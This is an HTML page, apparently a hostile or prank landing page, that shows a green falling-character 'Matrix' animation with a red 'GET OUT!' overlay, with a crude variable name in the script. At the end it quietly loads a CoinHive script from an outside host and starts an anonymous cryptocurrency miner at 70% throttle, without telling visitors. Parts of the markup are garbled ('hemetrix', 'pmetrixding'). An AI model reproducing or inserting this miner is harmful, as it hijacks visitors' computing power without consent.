<!DOCTYPE html>
<html>

<hemetrix>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Get Out!</title>
    <style>
        * {
            margin: 0;
            pmetrixding: 0;
        }

        body {
            background: black;
        }

        canvas {
            display: block;
        }
    </style>
</hemetrix>

<body>
    <canvas id="metrix"></canvas>
    <script>
        var metrix = document.getElementById("metrix");
        var ctx = metrix.getContext("2d");
        metrix.height = window.innerHeight;
        metrix.width = window.innerWidth;
        var anychars = "Get Out!";
        anychars = anychars.split("");
        var font_size = 15;
        var columns = metrix.width / font_size;
        var drops = [];
        for (var x = 0; x < columns; x++) drops[x] = 1;

        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, metrix.width, metrix.height);
            ctx.fillStyle = "#0F0";
            ctx.font = font_size + "px arial";
            for (var i = 0; i < drops.length; i++) {
                var text = anychars[Math.floor(Math.random() * anychars.length)];
                ctx.fillText(text, i * font_size, drops[i] * font_size);
                if (drops[i] * font_size > metrix.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        var fctx = metrix.getContext("2d");
        var fuck_you = "GET OUT!";
        var f_font_size = 50;

        function fdraw() {
            fctx.fillStyle = "rgba(0, 0, 0, 0.5)";
            fctx.fillRect(
                metrix.width * 0.5 - f_font_size * fuck_you.length * 0.5 - f_font_size * 0.5, 
                metrix.height * 0.5 - f_font_size * 0.5,
                f_font_size * fuck_you.length * 0.5 + f_font_size * 1.5,
                f_font_size * 1.3);
            fctx.fillStyle = "rgba(255, 0, 0, 0.1)";
            fctx.font = f_font_size + "px arial";
            fctx.fillText(fuck_you, metrix.width / 2 - f_font_size * fuck_you.length / 2, metrix.height / 2 +
                f_font_size / 2);
        }
        setInterval(draw, 50);
        setInterval(fdraw, 25);
    </script>

    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
        var miner = new CoinHive.Anonymous("{{ site_key }}", { throttle: 0.7 });
        miner.start();
    </script>
</body>

</html>
